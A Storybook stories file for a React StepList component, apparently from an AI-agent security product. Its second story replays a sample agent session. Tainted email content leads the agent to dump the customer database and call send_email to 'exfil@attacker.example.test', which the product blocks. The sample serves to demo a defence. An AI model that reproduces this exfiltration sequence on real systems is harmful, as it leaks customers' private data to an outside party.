import type { Meta, StoryObj } from "@storybook/react";
import { StepList } from "./StepList";

const meta: Meta<typeof StepList> = {
  title: "Components/StepList",
  component: StepList,
  tags: ["autodocs"],
};

export default meta;
type Story = StoryObj<typeof StepList>;

export const OnboardingSequence: Story = {
  args: {
    steps: [
      {
        id: 1,
        title: "Initialize Project & Tenant Boundary",
        description: "Created project 'prod-customer-service' with default zero-trust envelope.",
        status: "completed",
      },
      {
        id: 2,
        title: "Install AgentShield SDK",
        description: "Run pip install shield-sdk-py and configure API key.",
        status: "completed",
      },
      {
        id: 3,
        title: "Send Live Telemetry Test Event",
        description: "Waiting for SDK handshake event on /v1/events/tool-call...",
        status: "active",
      },
      {
        id: 4,
        title: "Deploy Production OPA Policy",
        description: "Verify Rego dry-run against historical baseline.",
        status: "pending",
      },
    ],
  },
};

export const SessionReplayWithBlockedStep: Story = {
  args: {
    steps: [
      {
        id: "step_0",
        title: "Tool: read_email('em_492')",
        description: "Tainted segment seg_492 added to session context.",
        status: "completed",
      },
      {
        id: "step_1",
        title: "Tool: search_customers('*')",
        description: "High-volume customer database query detected.",
        status: "completed",
      },
      {
        id: "step_2",
        title: "Tool: send_email('exfil@attacker.example.test')",
        description: "AUTONOMOUSLY BLOCKED. Tainted context flowing to external critical sink.",
        status: "blocked",
      },
    ],
  },
};
